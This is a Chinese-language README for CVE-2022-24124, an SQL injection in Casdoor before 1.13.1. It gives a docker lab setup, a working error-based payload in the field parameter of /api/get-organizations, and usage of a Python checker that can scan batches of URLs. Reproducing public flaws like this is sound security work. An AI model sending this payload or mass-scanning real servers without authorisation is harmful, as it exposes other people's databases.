## 前言
Casdoor是一个基于OAuth 2.0/OIDC的中心化的单点登录（SSO）身份验证平台

---
## 编号
CVE编号:CVE-2022-24124

CNPD编号:CNPD-202201-7304

---
## 影响版本
危险等级：高 ( 7.5 HIGH )

POC/EXP：已公开

Casdoor < Casdoor 1.13.1 //1.13.1版本之前均受影响

---
## 漏洞简介
此漏洞属于Sql注入漏洞，在查询API 存在与字段和值参数相关的SQL 注入漏洞，如api/get-organizations 所示。

---
## 复现
拉取漏洞镜像

`docker pull vulfocus/casdoor:1.13.0`

![拉取docker](https://user-images.githubusercontent.com/81157360/187730577-adc079f5-90ae-4506-b4b4-d50866d6b51f.png)

启动漏洞环境

`docker run -itd -p 8000:8000 -it -d vulfocus/casdoor:1.13.0`

![dockerRun](https://user-images.githubusercontent.com/81157360/187730597-0fd44631-ef43-4c9d-b30e-5c079cfbe50c.png)

打开漏洞环境页面

![http](https://user-images.githubusercontent.com/81157360/187730729-321adfa0-d397-4b5d-b3e4-99c9a5e2da02.png)

使用POC构造payload
> POC: /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),3)

![1661963474975](https://user-images.githubusercontent.com/81157360/187731108-0f748637-ff45-48ad-bcf8-2230719bf67b.jpg)

---

## 一键验证脚本
### 声明: 工具仅供安全研究或授权渗透，非法用途后果自负，作者并不承担任何责任以及连带责任

```python
python3 CVE-2022-24124.py -h
```
![image](https://user-images.githubusercontent.com/81157360/187732923-588ba7e3-0f8f-4d7f-84ff-0285c113d287.png)


```python
python3 CVE-2022-24124.py -u http://127.0.0.1
```
![image](https://user-images.githubusercontent.com/81157360/187732285-125f64d1-c0da-491b-a823-5ea86f6bb4c9.png)

```python
python3 CVE-2022-24124.py -f urls.txt
```
![image](https://user-images.githubusercontent.com/81157360/187732476-6fee8c34-9146-46ce-963e-4f4fcfb912df.png)

---
## 相关信息

https://nvd.nist.gov/vuln/detail/CVE-2022-24124

https://github.com/ColdFusionX/CVE-2022-24124

https://github.com/0xAbbarhSF/CVE-2022-24124

借鉴于https://www.t00ls.com/thread-66989-1-1.html

练手写了一个python版本的，并且加了一个批量检测的功能
